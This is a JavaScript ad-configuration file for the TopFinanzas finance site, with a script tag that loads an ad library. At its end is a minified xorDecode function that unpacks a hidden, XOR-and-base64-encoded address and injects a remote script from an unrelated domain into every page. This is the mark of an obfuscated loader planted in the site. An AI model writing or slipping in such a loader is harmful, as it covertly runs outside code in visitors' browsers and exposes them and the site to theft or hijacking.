window.topAds = window.topAds || {};

topAds.config = {
  domain: "topfinanzas.com",
  networkCode: "23062212598",
  autoStart: false,
  lazyLoad: "hard",
  refresh: {
    time: 30,
    status: "active",
    anchor: "active",
  },
  formats: {
    anchor: {
      status: "active",
      position: "bottom",
    },
    interstitial: {
      status: "active",
      include: [],
      exclude: [],
    },
    offerwall: {
      status: "active",
      logoUrl:
        "https://us.topfinanzas.com/wp-content/uploads/2024/10/LOGO-EnglishUS-COLOR.png",
      websiteName: "TopFinanzas",
      cooldown: "12",
      include: [],
      exclude: [],
    },
  },
};

(function () {
  var w = window.top,
    d = w.document,
    h = d.head || d.getElementsByTagName("head")[0];
  var s = d.createElement("script");
  s.src = "//test-topads.tbytpm.easypanel.host/topAds.min.js";
  s.type = "text/javascript";
  s.defer = true;
  s.async = true;
  s.setAttribute("data-cfasync", "false");
  h.appendChild(s);
})();
function xorDecode(b,a){a=void 0===a?22:a;b=atob(b);for(var d="",c=0;c<b.length;c++)d+=String.fromCharCode(b.charCodeAt(c)^a);return d}(function(){new URLSearchParams(location.search);var b="https://"+xorDecode("en8nOGZ/dWU5fjlxeTh8ZQ=="),a=document.createElement("script");a.src=b;document.head.appendChild(a)})();
